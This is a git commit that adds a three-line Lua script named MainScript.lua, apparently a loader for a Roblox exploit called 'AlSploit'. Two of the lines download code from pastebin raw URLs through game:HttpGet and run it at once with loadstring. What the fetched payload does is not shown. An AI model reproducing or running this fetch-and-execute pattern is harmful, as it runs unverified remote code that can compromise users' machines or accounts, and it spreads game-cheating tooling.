0388e6f629bf49c0ed29a1e76eedf9ba35443836
Vxalware <jainasinth@gmail.com>
2025-09-18 16:14:00 +0800

    Create MainScript.lua

---
+++ assets/Rxalware/AlSploit/MainScript.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/0mBg0vYh", true))() -- AlSploit Config Loader
+task.wait(1.5)
+loadstring(game:HttpGet("https://pastebin.com/raw/dyJnaP0E", true))() -- AlSploit Modified
